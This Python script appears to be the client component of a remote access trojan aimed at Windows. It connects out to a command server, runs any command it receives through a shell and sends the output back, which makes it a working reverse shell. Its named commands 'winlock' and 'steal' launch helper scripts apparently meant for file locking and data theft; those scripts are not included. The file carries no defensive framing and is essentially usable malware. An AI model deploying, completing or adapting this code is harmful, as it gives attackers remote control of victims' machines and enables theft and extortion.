import socket
import subprocess
import requests
import ctypes
import sys
import os

kernel32 = ctypes.windll.kernel32

def start_client(server_ip, server_port):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((server_ip, server_port))

        while True:
            command = client.recv(1024).decode()

            if not command:
                break

            print(f"[Received Command]: {command}")

            if command.lower() == "exit":
                break

            if command.lower() == "getid":
                try:
                    r = requests.get("https://api.example.com/info", headers={"Accept": "application/json"})
                    response = r.json()
                    output = str(response).encode()
                    client.send(output)
                    continue
                except Exception as e:
                    output = f"Error: {str(e)}".encode()
                    client.send(output)
                    continue

            if command.lower().startswith("extool "):
                try:
                    result = subprocess.check_output(['python', os.path.join(os.path.dirname(__file__), 'tools', 'extool.py')] + command.split()[1:], universal_newlines=True)
                    client.send(result.encode())
                except Exception as e:
                    client.send(f"Error: {str(e)}".encode())
                continue

            if command.lower() == "winlock":
                try:
                    result = subprocess.check_output(['python', os.path.join(os.path.dirname(__file__), 'tools', 'fslocker.py')], universal_newlines=True)
                    client.send(result.encode())
                except Exception as e:
                    client.send(f"Error: {str(e)}".encode())
                continue
            if command.lower() == "steal":
                try:
                    result = subprocess.check_output(['python', os.path.join(os.path.dirname(__file__), 'tools', 'thsteal.py')], universal_newlines=True)
                    client.send(result.encode())
                except Exception as e:
                    client.send(f"Error: {str(e)}".encode())
                continue

            try:
                output = subprocess.check_output(
                    command,
                    shell=True,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True
                )
            except subprocess.CalledProcessError as e:
                output = e.output

            client.send(output.encode())

    except Exception as e:
        print(f"Connection error: {str(e)}")
    finally:
        client.close()

if __name__ == "__main__":
    SERVER_IP = "127.0.0.1"
    SERVER_PORT = 5555

    try:
        start_client(SERVER_IP, SERVER_PORT)
    except KeyboardInterrupt:
        print("\nClient terminated by user")
        sys.exit(0)